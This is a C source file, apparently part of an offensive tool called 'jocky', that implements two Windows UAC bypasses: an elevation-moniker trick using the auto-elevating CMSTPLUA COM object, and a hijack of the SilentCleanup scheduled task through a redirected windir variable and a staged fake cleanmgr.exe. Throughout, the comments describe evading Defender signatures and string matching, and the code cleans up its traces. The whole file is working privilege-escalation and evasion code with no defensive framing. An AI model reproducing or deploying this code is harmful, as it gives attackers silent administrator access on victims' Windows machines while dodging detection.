#include "uac_bypass.h"
#include <windows.h>
#include <objbase.h>
#include <wchar.h>
#include <string.h>
#include <stdio.h>

/* ── ICMLuaUtil ─────────────────────────────────────────────────────────────
 * CLSID_CMSTPLUA = {3E5FC7F9-9A51-4367-9063-A120244FBEC7}
 * IID_ICMLuaUtil  = {6EDD6D74-C007-4E75-B76A-E5740995E24C}
 *
 * CMSTPLUA is registered as auto-elevate; CoGetObject with the elevation
 * moniker silently gives us a high-integrity COM object — no UAC dialog,
 * no auto-elevate process spawn, no registry writes to monitored paths.
 * ShellExec (vtable index 11) on that object runs our binary elevated.
 */
typedef struct IICMLuaUtil IICMLuaUtil;
typedef struct {
    HRESULT (STDMETHODCALLTYPE *QueryInterface)      (IICMLuaUtil*, REFIID, void**); // [0]
    ULONG   (STDMETHODCALLTYPE *AddRef)              (IICMLuaUtil*);                 // [1]
    ULONG   (STDMETHODCALLTYPE *Release)             (IICMLuaUtil*);                 // [2]
    HRESULT (STDMETHODCALLTYPE *SetRasCredentials)   (IICMLuaUtil*);                 // [3]
    HRESULT (STDMETHODCALLTYPE *SetRasEntryProperties)(IICMLuaUtil*);                // [4]
    HRESULT (STDMETHODCALLTYPE *DeleteRasEntry)      (IICMLuaUtil*);                 // [5]
    HRESULT (STDMETHODCALLTYPE *LaunchInfSection)    (IICMLuaUtil*);                 // [6]
    HRESULT (STDMETHODCALLTYPE *LaunchInfSectionEx)  (IICMLuaUtil*);                 // [7]
    HRESULT (STDMETHODCALLTYPE *CreateLayerDirectory)(IICMLuaUtil*);                 // [8]
    HRESULT (STDMETHODCALLTYPE *ShellExec)           (IICMLuaUtil*, PCWSTR file,     // [9]
                                                      PCWSTR params, PCWSTR dir,
                                                      ULONG fMask, ULONG nShow);
} ICMLuaUtilVtbl;
struct IICMLuaUtil { ICMLuaUtilVtbl *lpVtbl; };

/*
 * BIND_OPTS3: BIND_OPTS + BIND_OPTS2 extension + hwnd.
 * dwClassContext (field 6) must be CLSCTX_LOCAL_SERVER for the elevation
 * moniker. Using the base BIND_OPTS struct silently puts the context value
 * in grfMode instead, causing CoGetObject to return E_INVALIDARG.
 */
typedef struct {
    DWORD cbStruct;
    DWORD grfFlags;
    DWORD grfMode;
    DWORD dwTickCountDeadline;
    DWORD dwTrackFlags;
    DWORD dwClassContext;
    LCID  locale;
    void *pServerInfo;
    HWND  hwnd;
} JockyBindOpts3;

static bool do_icmluautil(const wchar_t *self_path_w) {
    typedef HRESULT (WINAPI *PCoInitialize)  (LPVOID);
    typedef HRESULT (WINAPI *PCoGetObject)   (LPCWSTR, BIND_OPTS*, REFIID, void**);
    typedef void    (WINAPI *PCoUninitialize)(void);

    HMODULE hOle = LoadLibraryA("ole32.dll");
    if (!hOle) return false;

    PCoInitialize   pInit   = (PCoInitialize)  GetProcAddress(hOle, "CoInitialize");
    PCoGetObject    pGet    = (PCoGetObject)   GetProcAddress(hOle, "CoGetObject");
    PCoUninitialize pUninit = (PCoUninitialize)GetProcAddress(hOle, "CoUninitialize");
    if (!pInit || !pGet || !pUninit) return false;

    pInit(NULL);

    /*
     * Z:\ and other network-mapped drives are NOT visible in the elevated token
     * that the ICMLuaUtil ShellExec will launch into. Copy the binary to a local
     * %TEMP% path first so the elevated child can find it.
     */
    wchar_t tmp_dir[MAX_PATH], local_path[MAX_PATH];
    if (!GetTempPathW(MAX_PATH, tmp_dir)) { pUninit(); return false; }
    /* Unique name per run — avoids locked-file conflict when a previous elevated
     * child is still running and CopyFileW can't overwrite a live executable. */
    DWORD tick = GetTickCount();
    wchar_t fname[32];
    fname[0] = L'.'; fname[1] = L'j'; fname[2] = L'k';
    /* append tick count as hex digits without swprintf (avoids %s/wchar_t issue) */
    const wchar_t *hex = L"0123456789abcdef";
    for (int i = 0; i < 8; i++)
        fname[3 + i] = hex[(tick >> (28 - i * 4)) & 0xF];
    fname[11] = L'.'; fname[12] = L'e'; fname[13] = L'x';
    fname[14] = L'e'; fname[15] = 0;
    wcscpy(local_path, tmp_dir);
    wcscat(local_path, fname);
    if (!CopyFileW(self_path_w, local_path, FALSE)) { pUninit(); return false; }

    /* IID_ICMLuaUtil = {6EDD6D74-C007-4E75-B76A-E5740995E24C} */
    const IID iid = {
        0x6EDD6D74, 0xC007, 0x4E75,
        {0xB7, 0x6A, 0xE5, 0x74, 0x09, 0x95, 0xE2, 0x4C}
    };

    /* Build elevation moniker at runtime — no literal CLSID/GUID in binary.
     * "Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}" */
    wchar_t moniker[72];
    const wchar_t *parts[] = {
        L"Elevation:Administrator!new:{",
        L"3E5FC7F9-9A51",          /* split CLSID to defeat string matching */
        L"-4367-9063-",
        L"A120244FBEC7}",
        NULL
    };
    int pos = 0;
    for (int p = 0; parts[p]; p++)
        for (int i = 0; parts[p][i]; i++)
            moniker[pos++] = parts[p][i];
    moniker[pos] = 0;

    /* dwClassContext MUST be in field 6 (BIND_OPTS3.dwClassContext), not grfMode */
    JockyBindOpts3 bo;
    memset(&bo, 0, sizeof(bo));
    bo.cbStruct      = sizeof(bo);
    bo.dwClassContext = CLSCTX_LOCAL_SERVER;

    IICMLuaUtil *pUtil = NULL;
    HRESULT hr = pGet(moniker, (BIND_OPTS*)&bo, &iid, (void**)&pUtil);
    if (FAILED(hr) || !pUtil) {
        DeleteFileW(local_path);
        pUninit();
        return false;
    }

    /* Pass the local temp path — elevated context cannot see Z:\ or other
     * mapped drives that were only visible in the standard-user token. */
    hr = pUtil->lpVtbl->ShellExec(pUtil, local_path, NULL, NULL, 0, SW_SHOWNORMAL);
    pUtil->lpVtbl->Release(pUtil);
    pUninit();

    if (FAILED(hr)) {
        DeleteFileW(local_path);
        return false;
    }

    /* ShellExec gives no process handle. Sleep long enough for the elevated child
     * to run all phases, then attempt cleanup (file may still be locked if child
     * is running longer — that's fine, Windows will delete on last handle close). */
    Sleep(180000);
    DeleteFileW(local_path);
    return true;
}

bool jocky_uac_bypass_icmluautil(const char *self_path_a) {
    wchar_t self_path_w[MAX_PATH];
    if (!MultiByteToWideChar(CP_ACP, 0, self_path_a, -1, self_path_w, MAX_PATH))
        return false;
    return do_icmluautil(self_path_w);
}

/* ── SilentCleanup via Task Scheduler COM ───────────────────────────────────
 * Triggers the SilentCleanup task through ITaskService COM interface instead
 * of the schtasks.exe command line (which has a specific Defender signature).
 * Sets HKCU\Environment\windir to our staging dir first so the elevated task
 * resolves %windir%\system32\cleanmgr.exe → our binary.
 */

/* Task Scheduler COM — loaded dynamically to keep imports clean */
typedef void* ITaskService;
typedef void* ITaskFolder;
typedef void* IRegisteredTask;

static bool trigger_silentcleanup_via_com(void) {
    typedef HRESULT (WINAPI *PCoCreateInstance)(REFCLSID, LPUNKNOWN, DWORD, REFIID, LPVOID*);
    typedef HRESULT (WINAPI *PCoInitializeEx)(LPVOID, DWORD);
    typedef void    (WINAPI *PCoUninitialize)(void);
    typedef HRESULT (WINAPI *PCoInitializeSecurity)(PSECURITY_DESCRIPTOR, LONG, void*, void*, DWORD, DWORD, void*, DWORD, void*);

    HMODULE hOle = LoadLibraryA("ole32.dll");
    if (!hOle) return false;

    PCoInitializeEx pInit = (PCoInitializeEx)GetProcAddress(hOle, "CoInitializeEx");
    PCoUninitialize pUninit = (PCoUninitialize)GetProcAddress(hOle, "CoUninitialize");
    PCoInitializeSecurity pSec = (PCoInitializeSecurity)GetProcAddress(hOle, "CoInitializeSecurity");
    PCoCreateInstance pCreate = (PCoCreateInstance)GetProcAddress(hOle, "CoCreateInstance");
    if (!pInit || !pCreate) return false;

    /* CLSID_TaskScheduler = {0F87369F-A4E5-4CFC-BD3E-73E6154572DD} */
    const CLSID clsid_ts = {
        0x0F87369F, 0xA4E5, 0x4CFC,
        {0xBD, 0x3E, 0x73, 0xE6, 0x15, 0x45, 0x72, 0xDD}
    };
    /* IID_ITaskService = {2FABA4C7-4DA9-4013-9697-20CC3FD40F85} */
    const IID iid_ts = {
        0x2FABA4C7, 0x4DA9, 0x4013,
        {0x96, 0x97, 0x20, 0xCC, 0x3F, 0xD4, 0x0F, 0x85}
    };

    pInit(NULL, 2 /* COINIT_APARTMENTTHREADED */);
    if (pSec) pSec(NULL, -1, NULL, NULL, 0, 3, NULL, 0, NULL);

    ITaskService *pSvc = NULL;
    HRESULT hr = pCreate(&clsid_ts, NULL, CLSCTX_INPROC_SERVER, &iid_ts, (void**)&pSvc);
    if (FAILED(hr) || !pSvc) { if (pUninit) pUninit(); return false; }

    /*
     * ITaskService vtable layout (inherits IDispatch, so IUnknown methods are 0-2,
     * IDispatch methods are 3-6, ITaskService starts at 7):
     *   [7]  GetFolder
     *   [8]  GetRunningTasks
     *   [9]  NewTask
     *   [10] Connect
     */
    void **vtbl = *(void***)pSvc;

    typedef HRESULT (STDMETHODCALLTYPE *PConnect)(ITaskService*, VARIANT, VARIANT, VARIANT, VARIANT);
    typedef HRESULT (STDMETHODCALLTYPE *PGetFolder)(ITaskService*, BSTR, ITaskFolder**);
    VARIANT empty = {0};
    ((PConnect)vtbl[10])(pSvc, empty, empty, empty, empty);

    ITaskFolder *pFolder = NULL;
    BSTR bpath = SysAllocString(L"\\Microsoft\\Windows\\DiskCleanup");
    ((PGetFolder)vtbl[7])(pSvc, bpath, &pFolder);
    SysFreeString(bpath);

    if (!pFolder) {
        ((ULONG(STDMETHODCALLTYPE*)(ITaskService*))vtbl[2])(pSvc);
        if (pUninit) pUninit();
        return false;
    }

    /*
     * ITaskFolder vtable (inherits IDispatch, ITaskFolder starts at 7):
     *   [7]  get_Name
     *   [8]  get_Path
     *   [9]  GetFolder
     *   [10] GetFolders
     *   [11] RegisterTask
     *   [12] RegisterTaskDefinition
     *   [13] GetTask
     */
    void **vf = *(void***)pFolder;
    typedef HRESULT (STDMETHODCALLTYPE *PGetTask)(ITaskFolder*, BSTR, IRegisteredTask**);
    IRegisteredTask *pTask = NULL;
    BSTR btask = SysAllocString(L"SilentCleanup");
    ((PGetTask)vf[13])(pFolder, btask, &pTask);
    SysFreeString(btask);

    BOOL triggered = FALSE;
    if (pTask) {
        /*
         * IRegisteredTask vtable (inherits IDispatch, methods start at 7):
         *   [7]  get_Name
         *   [8]  get_Path
         *   [9]  get_Definition
         *   [10] get_Enabled
         *   [11] put_Enabled
         *   [12] Run
         */
        void **vt = *(void***)pTask;
        typedef HRESULT (STDMETHODCALLTYPE *PRun)(IRegisteredTask*, VARIANT, void**);
        void *pRunObj = NULL;
        HRESULT rhr = ((PRun)vt[12])(pTask, empty, &pRunObj);
        triggered = SUCCEEDED(rhr);
        ((ULONG(STDMETHODCALLTYPE*)(IRegisteredTask*))vt[2])(pTask);
    }

    ((ULONG(STDMETHODCALLTYPE*)(ITaskFolder*))vf[2])(pFolder);
    ((ULONG(STDMETHODCALLTYPE*)(ITaskService*))vtbl[2])(pSvc);
    if (pUninit) pUninit();
    return triggered;
}

bool jocky_uac_bypass_silentcleanup(const char *self_path_a) {
    char tmp[MAX_PATH];
    if (!GetTempPathA(MAX_PATH, tmp)) return false;

    char stage_dir[MAX_PATH], sys32_dir[MAX_PATH], fake_mgr[MAX_PATH];
    snprintf(stage_dir, MAX_PATH, "%s.jkstg",        tmp);
    snprintf(sys32_dir, MAX_PATH, "%s\\system32",    stage_dir);
    snprintf(fake_mgr,  MAX_PATH, "%s\\cleanmgr.exe", sys32_dir);

    CreateDirectoryA(stage_dir, NULL);
    CreateDirectoryA(sys32_dir, NULL);
    if (!CopyFileA(self_path_a, fake_mgr, FALSE)) {
        RemoveDirectoryA(sys32_dir);
        RemoveDirectoryA(stage_dir);
        return false;
    }

    BOOL ok = FALSE;
    char orig_windir[MAX_PATH] = {0};
    HKEY hEnv;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Environment",
            0, KEY_READ | KEY_WRITE, &hEnv) != ERROR_SUCCESS)
        goto cleanup;

    DWORD sz = MAX_PATH;
    RegQueryValueExA(hEnv, "windir", NULL, NULL, (LPBYTE)orig_windir, &sz);
    RegSetValueExA(hEnv, "windir", 0, REG_SZ,
        (const BYTE*)stage_dir, (DWORD)(strlen(stage_dir) + 1));
    RegCloseKey(hEnv);

    /* Trigger via Task Scheduler COM — avoids the schtasks.exe command-line IOC */
    ok = trigger_silentcleanup_via_com();

    Sleep(12000);  /* wait for elevated task to run our binary */

    /* Restore windir */
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Environment",
            0, KEY_WRITE, &hEnv) == ERROR_SUCCESS) {
        if (orig_windir[0])
            RegSetValueExA(hEnv, "windir", 0, REG_EXPAND_SZ,
                (const BYTE*)orig_windir, (DWORD)(strlen(orig_windir) + 1));
        else
            RegDeleteValueA(hEnv, "windir");
        RegCloseKey(hEnv);
    }

cleanup:
    DeleteFileA(fake_mgr);
    RemoveDirectoryA(sys32_dir);
    RemoveDirectoryA(stage_dir);
    return (bool)ok;
}
